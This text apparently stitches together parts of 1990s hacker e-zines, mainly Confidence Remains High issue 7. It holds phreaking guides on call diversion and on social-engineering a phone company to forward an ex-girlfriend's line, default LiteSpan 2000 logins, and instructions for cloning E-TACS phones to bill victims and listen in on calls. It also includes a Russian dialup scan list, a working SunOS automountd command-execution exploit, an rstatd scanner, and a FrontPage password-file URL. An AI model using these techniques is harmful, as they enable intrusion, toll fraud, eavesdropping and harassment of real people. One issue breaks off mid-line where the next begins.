B1TCH.  Cause w3 dont all h4ve blueb0xes.. and n0t everyone 
has a laptop to carry round with onkels little bluebeep.
the only th1ng bout that program that was good was the neeto 
ascii/ansi art.  Anyway.. when u think of diverters wh0 comes to
mind?  
	
    AT&T - = - ani is dr0pped wh3n diverted to through intercept op
	
     MCI - = - these are the g00d guyz :P
	
W0RLDC0M - = - p4yf0ne please
	
     OCI - = - these stup1d sp1cs have ani n0w :(
	
TELTRUST - = - <----------- th3 supr3m3 in my l1f3 :)

Teltrust has nifty little backd00rs that allow u to access
operators usually only allowed through dialing 0 on a teltrust 
serviced.  i c4nn0t release th1s t0p s3kr3t enph0.. but its 
out there.. Op back doors are hard to find but... then again
u have all the time in the w0rld.

th1s is m33 4nd my teknique...
	
mee ------> operator -----> vmb with 800 dialout ---> meridian
-----> at&t ------> 911 b4ckd00r ----> c0pz pull up 0utside 
so1o's house...

eyem gonna take u through my easy st3p plan of h0w to d1vert
fr0m home, and seldom get caught..

1. Oldskewl stealing of service fr0m neighbor
2. C4ll f0rw4rding st1ll 0wns u.. and if u kn0w much bout switches ;) 
   th1s can aid u greatly in diverting..  Setting up your own diverters
   w1th c4ll f0rwarding is th3 m0st safest sh1t, cept... please divert
   wh3n owning your local sw1tch... unless its us west.. they d0nt have
   ani @#!#$!@#$ i swear ( well i w1sh ).  
 
h3r3z l33t pr0ceedure f0r adding call forwarding under 1a.

RC:CFV:\          add1ti0n of f0rwarding features
ORD 1\            sp33d of activation :) 1 = n0w damn it
BASE XXXXXXX\     th3 l0cal number u are add1ng features too
TO XXXXXXX\       route to where? 801 855 3326 "y0u h4ve r3ached bah"
PFX\              s3t pr3f1x 1 if ld dialing.. although i believe 800 is
		  possible
!                 execute damn it..

my l0cal switch being 1a.. dats all eye deel with.. but...
5e becomes easier d0 to the fact that if u have access to 
recent change channels on a 5e.. or rcmac sk1lls.. 
u can easily add forwarding...

The 5e rc/vfy is s0 much simpler... its call3d w1nd0ze 5e..
with neet little ascii menus..

If y0u are n0t an rcm4c w1z...
The business office werkers are clueless..
i use uswest as my example m0stly d0 to them being my rb0c..
but anywayz.

me> dials 18002441111 (servicing for home usage)
automated attendant> Enter Area C0DE and 7 digit number
me> 3608646226 <--------ex girlfriendz
aa> real attendant.... c0uld u please give me seven digit
		       number u are calling about please
                       g1ve it t0 real attendant.
me> uh yes 3608646226
ra> h0w can i h3lp u Mr J0hnson. 
me> w3ll ummm uh me and family are going out of t0wn for a week..
me> i w4z wondering if u c0uld add f0rwarding or f0rward all my calls to
me> 8018553326 . . . . . sure th1ng mister j0hnson.. they w1ll then say..
ra> th1s feature will be online by 5:00 tomm0row nite.. 
me> U SP1C 0F 4n Op U D!dnt ASK f0r Any ID!@#$ bahahahahh 0wned

. sektion 2 .

voice mail systems have been around for ever...
all had oftered the same benefits under systems
such as audiotext, audix, asp3n and older systems.
these days the p0ssibilites are endless.

some of the newer syst3ms.. that unf0rtunately i dont have
actual hard copy f0r.. carry newer features... this includes
b0x forwarding, pager n0tification, c4ll f0rwarding, and
message f0llow mee..

for inst4nce... dial 1800xxxxxxx

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
   Back to basic vmb hack1ng  
	
these new little systems include 
pr0mpts such as enter box number
and password.. this rem0ves the 
ease and makes it almost impossible
to hack.  Yes.. search f0r systems
u kn0w have outdial capabilities

9999 is still the admin b0x
9999 is still the most common used password

Newer systems are adding l0nger k0dez.. and sumtimes only 
codes but no actual box number.  anyway.. h0w can this help
u in diverting..?  After u have owned vmb with 800 access?
well simple really.. it can be used f0r number of things.. 
dialing att mci and maj0r ld companies f0r ld purposes
totally legit of course..  The pager n0tification feature owns
me. herez the tekniq

call business office.. like in above insert
and add call forwarding to a fone or number u kn0w never
gets called.. forward it to an0ther number.. have that number
forwarded.. at the end of chain .. put your pager number :)
n0t like this isnt obvious or anything.. they just c4nt pr0ve nuffin.
its neet to listen 1800864BLAH call my pager after bouncing through
all these neet forwarded numbers and hitting the u have reached
a pagenet serviced pager... please leave numeric message
at the tone, and hit star when finished.  I just wanna make 
aware things people have forgotten about.. people spend to worrying bout
" the switch, rcmac, nac, scc " and all the nitty gritty of a boc.  Think
of what can be done without even hassling.. 	

. pbx .

u have read billion txt files on pbxs.. i just recommend reading
cavaliers.

bah hit *9 or dial one of those nifty 800555xxxx pbxs with 2 digit 
codes.. oh btw.. th0se ones are probably traps for defcon kids.

. sektion 3 .

my thoughts on tracing...

listen.... in our day and age.. it is very easy for u to be traced..
the thing is, cdma, wireless, broadband, cellular communications is 
aiding us.  If u have a modded oki with antitriangulated mods plus 
b1llion pairs..?  WH0 ARE THEY TRACING .. the ani .. is always there
ani failures is yes.. likely to happen every once in a while when to 
sw1tches d0nt c0mmunicate .. but g0d damn people.. 

anyway..

th1s f1le pr0bably did nuffin for your clooless self..
but maybe spawned a couple ideas in your head such as

efpee diverting diagr4ms

mee -> oki -> pbx with intercept opt access at *9 -> opdivert -> vmb with 
800 dialout -> teltrust -> k0d3z -> pbx -> sekret service in 206

"TR4C3 TH1S MUTHA FUCK3R"

I typed in 30 minutes without leet speek filter..

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. An introduction to LightSpan 2000's : dlc
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

1 : The Basics.
---------------

This article is going to be broken up into 3 parts because for convenience.

Here is the first, if you don't understand this, don't move on. Also if you
don't need to know anything about lightspans don't bother reading this act
of masochism.

A Litespan 2000 unit is a Synchronous Optical Network (SONET) based Optical
Loop Carrier (OLC) system. It provides the function of four seperate systems
cobmined into one. Those systems are as follows:

Digital Loop Carrier (DLC).

   Provides 2,016 DS0s of bandwidth for delivery of services such as data,
   coin, or dial tone.

Digital Cross Connect System (DCS).

   Takes apart DS1 signals into DS0, rearanges them and puts them back
   into DS1 signals. This is know as 1-0-1 cross-connect.

SONET Fiber transport system

   Uses lightwave technology and SONET protcol to transport signals between
   lightspan terminals.

Mulitplexer (MUX)

   Takes multiple low speed signals (DS0s, DS1s) and interleaves them
   to form a single high speed data stream at SONET bit rates.

2 : System Security.
--------------------

Litespan 2000 unit security is very simple, but when considerig it
accessability by outside systems, it is adequate. If you ever get access
to a litespan 2000 terminal or are able to access it remotely this may help.
  
The Litespan provides two levels of security to maintain system integrity.
These security levels controls who can access the system and what the
authorized user is allowed to do in the system.
 
Each authorized user is assigned a set of privleges that determine the
actions allowed to the user.
 
The Litespan maintains an internal list of authorized user IDs, passwords,
and user privleges. There are up to 20 users possible. 
 
Now to access security you will be prompted for a User ID and a password
at a terminal that looks much like this :
 
 OMAPS Log In
 OMAPS V05.01.05 Copyright 1997 Optlink Corp. All Rights Reserved
 
 User Id: 
 Password:

Now for the ball busting part. If you repeat the login procedure
incorrectly 5 times you will be locked out of the system. Also the user
ID's can be up to 20 characters, a number or letters with both upper and
lower case, this is the same with the password.

The litespan has a sysadmin like in a unix system, but the litespan admin
usually has a long beard and a smug expression. But it is possible that a
dumb sysadmin will leave in the default logins/passwords. Those are as
follows:
 
  User ID: optlink
 Password: optlink
 
 and..
 
  User ID: sysadmin
 Password: sysadmin
 
...Well that gives you a look at System Security from the outside, Look at
   part 3 if you were able to get in. It gives a run down on User Privleges.

3 : User Privileges.
--------------------

Well user privleges are important, the sysadmin maintainsa file in the
system that gives different users different privileges. The user
privileges file will be setup somewhat like this:

User Id    Password   CP  M  M0  M1  N  NR  P  PR  P0  P1  S  T
Fatass       *****     x                 x         x       x                     x                  x
BigBone      *****     x                 x         x          x               x        x

That is a basic layout. The CP, M, M0 ect. are privileges.
The X's are basically checks allowing a certain user to perform a certian
act in the system. The Different Privleges are as follows:

  CP = Allows someone to change the user ID, password or privileges of
       any user on the system. This is one of the sysadmins privileges
       for the most part.

  M0 = Maintenance privilege (DS0 only)

  M1 = Maintenance privilege (DS1 only)

  MR = Maintenace READ ONLY privilege

  N  = Network Administrative privilege; Allows backup and
       restore of database

  NR = Network Administrative READ ONLY privilege; Allows access to network
       information

  P = Provisioning privilege; Neccesary to make changes from the
      provisioning menu

  P0 = Provisioning privilege (DS0 only)

  P1 = Provisioning privilege (DS1 only)

  PR = Provisioning READ ONLY privilege

  S = System Administrative privilege; Neccessary to make changes from
      the administrative menu
  T = Testing privlege; Allows execution of testing commands

Well that about raps it up. I may in the future update this,
But I doubt it. Look for future papers by me.

dlc

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. An introduction to the NEC P3 : daxx
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

The NEC P3 is a rather old mobile phone for use on any TACS or E-TACS
cellular telephone system (there is a list at http://c5.hakker.com/nec_p3/
to find out where there are such networks ; they exist in Europe,
Austria, Italy, the UK and Ireland). This phone was quite popular a few
years ago, so you should be able to pick one up used for little money.
I got one including two batteries & a charger for 50 IEP.

Now, what makes this phone so interesting? The availability of a
so-called Test-Mode-ROM for it!

As all mobile phones, this one has a read-only-memory chip in it, which
contains its software. This progam is started when you turn on the phone,
it could be compared to a computer's operating system. While the "normal"
version of the NEC P3's software allows you to do no extraordinary things,
basically only to place calls to a number you enter and to store numbers
along with names, the test-mode software lets you go into test mode, where
you can do many cool things...

Most importantly, you can change all the information in the phone's NAM
(number assignment module) - the ESN (electronic serial number) and the
MIN (mobile identifier number).

These two numbers are all there as an E-TACS phone's identity - program
in another phone's ESN & MIN (this information is called a pair) and
your NEC P3 becomes a clone of it. You will be able to make calls on the
bill of the phone you cloned and to receive calls under its number.

On a test-rom NEC P3, this process of reprogramming the NAM takes less
than a minute of pressing buttons on the keypad, and requires no connection
to a computer with a "chipping lead", as the vast majority of mobile phones
do. However there are plans for a computer-to-P3 cable, along with chipping
software, both are available on Dr. Who's Radiophone, which is now at...

     http://radiophone.dhp.com/nec/p200.html

The MIN prefix for Ireland's 088 network is 2720 (088-2 = 2722, 088-6 = 2726).
So if somebody's number is 088-313371, their MIN, and what you type in while
programming, is 2720313371. The ESN of a phone (an 11 digit number with
slashes dividing it) can almost always be found on a sticker on the back of
the phone, under the battery. So if you see someone's phone lying around,
just note down those numbers, put them in your P3, and mess up their bill.

In test mode, you can also scan all channels (listen in on calls going on
in your area), and break into conversations (can be funny, the call has to
be on a very nearby cell for that to work though). I've also put on a text
which describes how two P3's can be used as CB radios, without actually
using the cellular network (never done this myself, can anybody confirm that
this works?).

You have a P3, and would like to put a test-mode ROM in it?

Taking the actual chip out of the phone, or putting one in can be tricky,
the first and biggest obstacle being "tamper-proof" screws in the case.
However pliers with very thin ends worked OK, once I found suitable ones.
The complete instructions for doing this can also be downloaded below.

Getting the test-mode software (see below for the image file) written on
the existing rom chip from a P3, or getting a new 27C512 (200 nanoseconds
access time) EPROM with the software on it is probably the most difficult
part. You could try some electronics companies or university electronics
labs, or any other place which might be able and willing to write an EPROM
for you. This only takes a minute, but a previously written EPROM has to be
erased by exposure to UV light before being re-written, which takes at
least half an hour.

Further files are available from http://c5.hakker.com/nec_p3/

There's an easier way to get into test mode than the one. As you can simply
store your ESN in one of the 99 memory slots once (enter 11 digits, STO
(for instance) 68). Then every time you want to enter, you do RCL 68, STO 69,
RCL *, RCL # 01 and there you are, instead of keying in the whole ESN every
time.

So, go out, get a P3 or another kewl fone and have some fun while the E-TACS
networks are still on the air!

DaXX

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. More Russian dialups : Lirik
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

            +7-o95-913-xxxx Iskra(?) Telco scan for carriers
                     (?) 1997 CyberLirik/DarkMoon
                            with ToneLoc 1.x
                      comments to lirik@hotmail.com
               also check out http://207.222.215.67/________.lst

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

9133087  MMTEL> .x to get RemoteAccess 2503107111
                 .m to connect to MFD
         PAD NUA format :  NUA with DNIC ie MMTEL>2503107111

9133442  27*
9133440  36*
9133438  34*
9133437  33*
9133439  32*

9133994  login:
9133340

9133465  CONNECT 2400/NONE
9135899
9133353
9133467

9133094  MICRON: ADDRESS?
9133093

9133487  MS DOS 6.20 :)(krug.partya.ru) ((null))  login:

9133118  S'Ad;r+kE:q't`aqQ1<8;

9133507  *****************************

9133127  Port 1  login:

9133392  ROSPAC(IASNET) Local Dial Ups  02500 DNIC also TYMUSA
          [unpublished]  ntymusa .concert+ for TYMUSA

9133578  HqS$=x1*MÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        . [cZo] .          Team CodeZero Presents            . [cZo] .
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


      /IIIIIIIIII          /IIIIIIIIII           /III   /III
      \ III_____/          \ III___/III          \ III  \ III
       \ III                \ III  \ III          \ III  \_III
        \ III  onfidence     \ IIIIIIII  emains    \ IIIIIIIIII  igh
         \ III                \ III__/III           \ III__/ III
          \ III                \ III  \ III          \ III  \ III
           \ IIIIIIIIII   ___   \ III  \ III   ___    \ III  \ III   ___
            \_________/  /\__\   \__/   \__/  /\__\    \__/   \__/  /\__\
                         \/__/                \/__/                 \/__/


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                                                                      Issue 7
                                                            31st January 1998
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                             Editors : so1o and sw1tch

                            Gorgeous : dangergrl

                   Site of the month : www.dangergrl.com  <-- go there now.
        
                           The usual : om3n, zer0x, xFli, electro,
                                       Spheroid, el8, ultima and chameleon

                       Not forgotten : loss, organik, peenut, pzn, suid
                                       helix and manly

                   Special thanks to : Shok and vacuum

                Kick in the teeth to : dscan@hotmail.com

 VB coder kids who think they r Gods : www.sinnerz.com  (NOT LYNX FRIENDLY)


                     .-----------[ An Official ]-----------.
                     :      .-----.  .----.   .--.--.      :
                     :      :  .--'  : .-. :  :  :  :      :
                     !_-::  :  :     : `-' ;  :  .  :  ::-_!
                     :~-::  :: :     :: . :   ::    :  ::-~:
                     :      ::.`--.  ::.:  :  ::.:  :      :
                     :      `-----'  `--'--'  `--'--'      :
                     !_-::                             ::-_!
                     :~-::-[ Confidence Remains High ]-::-~:
                     :~-::                             ::-~:
                     `-----------[ Production ]------------'


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  In This "Added Vitamins" Issue : 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

------=>  Section A  :  Introduction And Cover Story.

    1. Confidence Remains High issue 7....................: Tetsu Khan
    2. The D-Lab..........................................: so1o

------=>  Section B  :  Exploits And Code.
 
    1. ipwatch.c..........................................: Deathstar
    2. Automountd remote exploit for SunOS 5.5.1..........: *unknown*
    3. statscan.c - statd scanner.........................: BiT
    4. FrontPage exploit..................................: chameleon / vacuum
    5. sunscan.sh.........................................: so1o
    6. classb.c...........................................: falken
    7. icmp444v.c.........................................: e4elite

------=>  Section C  :  Phones / Scanning / Radio.

    1. Realistic Pro-50 scanner discriminator mod.........: xFli

------=>  Section D  :  Miscellaneous.

    1. rpc-stat.pgp.......................................: so1o
    2. If you're really dumb..............................: so1o
    3. inetd backdoors....................................: Phreak-0
    4. 0wned..............................................: so1o
    5. dnscan.............................................: sw1tch
    6. The issues list for 1998...........................: so1o

------=>  Section E  :  World News.

    1. SpiceWorld hacked..................................: sw1tch
    2. zeon.net...........................................: ch-e-ztic

-------=> Section F  :  Projects.

    1. TOTALCON '98.......................................: so1o

------=> Section G  :  FIN.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Confidence Remains High issue 7 : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Welcome to issue 7 of the popular Confidence Remains High, as always, due to
our equality policy, as we assume nothing, there may be some parts that some
of you may dislike and think below you, as well as being some parts you
actually learn something from, as always, we hope you enjoy this issue, and
those to come in the future..

If you have a BBS, a webpage, ftp site, or anywhere where CRH is distributed,
get in touch with us on irc, or mail us at tk85@hotmail.com, and we'll give
you a mention and shit..

The distro list..
=================

   www.d-lab.com.ar                                 /crh/
   www.technotronic.com                             /ezines/crh/
   cybrids.simplenet.com                            /Toast/files/CRH/
   ftp.linuxwarez.com                               /pub/crh/
   ftp.sekurity.org                                 /users/so1o/
  
Also go to..
============

   www.dangergrl.com  <-- Go there now
   rhino9.abyss.com   <-- NT security
   www.hacked.net     <-- Archive of all the stuff we have 0wned.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. The D-Lab : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Our member chameleon set us up with a domain in Argentina, the D-Lab.. It has
some mad shit on it, but you have to know where to look, because
www.d-lab.com.ar will take you nowhere, it has 0-day exploits on it, as
well as other useful stuff and source code, check it out..

  http://www.d-lab.com.ar/sekret/warez/
  http://www.d-lab.com.ar/mad/
  http://www.d-lab.com.ar/crh/

Don't forget to check out http://www.dangergrl.com, it's our site of the month!

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ EXPLOITS / CODE ]==========[ .SECTION B. ]============[ EXPLOITS / CODE ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. ipwatch.c : Deathstar
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

..this code is over 2 years old now, and alot of people have it, so here it is
  on public release, heh, it r0x anyway.. allows you to view any connection
  on a Linux box in real time!@# it's like 69k so we've just added it in the
  crh007.zip, usage is like all in the interface, it just r00lz supr3me!

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Automountd remote exploit for SunOS 5.5.1 : *unknown*
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*

 this is really dumb automountd exploit, tested on solaris 2.5.1
 ./r blahblah /bin/chmod "777 /etc; 2nd cmd;3rd cmd" and so on, 
 map is executed via popen with key given as argument, read automount(1M)

 patch 10465[45] fixes this

 */

#include <sys/types.h>
#include <sys/time.h>
#include <stdio.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <rpcsvc/autofs_prot.h>

#define AUTOTS "datagram_v" /* XXX */

void usage(char *s) {
  printf("Usage: %s mountpoint map key [opts]\n", s);
  exit(0);
}

bool_t
xdr_mntrequest(xdrs, objp)
        register XDR *xdrs;
        mntrequest *objp;
{

        register long *buf;

        if (!xdr_string(xdrs, &objp->name, A_MAXNAME))
                return (FALSE);
        if (!xdr_string(xdrs, &objp->map, A_MAXNAME))
                return (FALSE);
        if (!xdr_string(xdrs, &objp->opts, A_MAXOPTS))
                return (FALSE);
        if (!xdr_string(xdrs, &objp->path, A_MAXPATH))
                return (FALSE);
        return (TRUE);
}

bool_t
xdr_mntres(xdrs, objp)
        register XDR *xdrs;
        mntres *objp;
{

        register long *buf;

        if (!xdr_int(xdrs, &objp->status))
                return (FALSE);
        return (TRUE);
}

main(int argc, char *argv[]) {
  char hostname[MAXHOSTNAMELEN];
  CLIENT *cl;
  enum clnt_stat stat;
  struct timeval tm;
  struct mntrequest req;
  struct mntres result;

  if (argc < 4)
    usage(argv[0]);
  
  req.path=argv[1];
  req.map=argv[2];
  req.name=argv[3];
  req.opts=argv[4];
  if (gethostname(hostname, sizeof(hostname)) == -1) {
    perror("gethostname");
    exit(0);
  }
  if ((cl=clnt_create(hostname, AUTOFS_PROG, AUTOFS_VERS, AUTOTS)) == NULL) {
    clnt_pcreateerror("clnt_create");
    exit(0);
  }
  tm.tv_sec=5;
  tm.tv_usec=0;
  stat=clnt_call(cl, AUTOFS_MOUNT, xdr_mntrequest, (char *)&req, xdr_mntres,
		(char *)&result, tm);
  if (stat != RPC_SUCCESS)
    clnt_perror(cl, "mount call"); 
  else 
    printf("mntres = %d.\n", result.status);
  clnt_destroy(cl);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. statscan.c - statd scanner : BiT
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/* 

 statd scanner by BiT,
 rpc shit ripped from rpcinfo, woopy!
 its done for now

 -- works fine from Linux boxes, just compile / follow usage. -so1o

 */

#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <rpc/rpc.h>
#include <rpc/pmap_prot.h>
#include <rpc/pmap_clnt.h>

#define VER "0.03"

int statd(char *host);
unsigned long int res(char *p);
void woopy(int s);
void usage(char *s);
void scan(char *i, char *o);

void usage(char *s)
{
  printf("Usage: %s inputfile outputfile\n",s);
  exit(-1);
}

void main(int argc, char **argv)
{
  printf("%s %s by BiT'97\n\n",argv[0],VER);
  if(argc<3)
    usage(argv[0]);
  scan(argv[1],argv[2]);
}

void scan(char *i, char *o)
{
  FILE *iff, *of;
  char buf[512];
  
  if((iff=fopen(i,"r")) == NULL)
    return;
  while(fgets(buf,512,iff) != NULL) 
  {
    if(buf[strlen(buf)-1]=='\n')
      buf[strlen(buf)-1]=0;
    if(statd(buf) && (of=fopen(o,"a")) != NULL) {
      buf[strlen(buf)+1]=0;
      buf[strlen(buf)]='\n';
      
      fputs(buf,of);
      fclose(of);
    }  
  }
  fclose(iff);
}

void woopy(int s)
{
  return;
}

int statd(char *host)
{
  struct sockaddr_in server_addr;
  struct pmaplist *head = NULL;
  int sockett = RPC_ANYSOCK;
  struct timeval minutetimeout;
  register CLIENT *client;
  struct rpcent *rpc;

  server_addr.sin_addr.s_addr=res(host);
  server_addr.sin_family=AF_INET;
  server_addr.sin_port = htons(PMAPPORT);
  minutetimeout.tv_sec = 15;
  minutetimeout.tv_usec = 0;
  
  /* cause clnttcp_create uses connect() */
  signal(SIGALRM,woopy);
  alarm(15);
  
  if ((client = clnttcp_create(&server_addr, PMAPPROG,
  	PMAPVERS, &sockett, 50, 500)) == NULL) {
    alarm(0);
    signal(SIGALRM,SIG_DFL);
    return 0;
  }
  alarm(0);
  signal(SIGALRM,SIG_DFL);
  
  if (clnt_call(client, PMAPPROC_DUMP, (xdrproc_t) xdr_void, NULL, 
  	(xdrproc_t) xdr_pmaplist, &head, minutetimeout) != RPC_SUCCESS)
    return 0;
  if (head != NULL) 
    for (; head != NULL; head = head->pml_next)
      if((rpc = getrpcbynumber(head->pml_map.pm_prog)))
        if(strcmp(rpc->r_name,"rstatd") == 0)
          return 1;              
   
  return 0;
}

unsigned long int res(char *p)
{
   struct hostent *h;
   unsigned long int rv;
    
   h=gethostbyname(p);
   if(h!=NULL)
     memcpy(&rv,h->h_addr,h->h_length);
   else
     rv=inet_addr(p);
   return rv;
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. FrontPage exploit : chameleon / vacuum
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                    
If a system is running FrontPage extensions, then you can do the following to
pull their service.pwd password file...

     http://www.site.here.com/_vti_pvt/service.pwd

